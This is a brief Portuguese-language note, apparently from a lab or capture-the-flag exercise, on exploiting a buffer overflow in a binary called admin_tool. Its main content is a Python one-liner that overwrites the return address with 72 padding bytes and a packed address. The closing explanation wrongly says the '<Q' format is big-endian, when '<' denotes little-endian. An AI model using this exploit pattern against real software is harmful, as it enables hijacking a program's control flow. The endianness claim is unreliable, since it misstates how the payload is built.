## Utilizando o python para explorar o buffer overflow

python3 -c "import struct; addr = struct.pack('<Q', 0x0000000000401236); offset = b'A' * 72; payload = offset + addr; print(payload.decode('latin-1'))" | ./admin_tool

0x0000000000401236

o parâmetro '<Q' define que é um endereço big endian e que vai ser passado um valor numérico para empacotar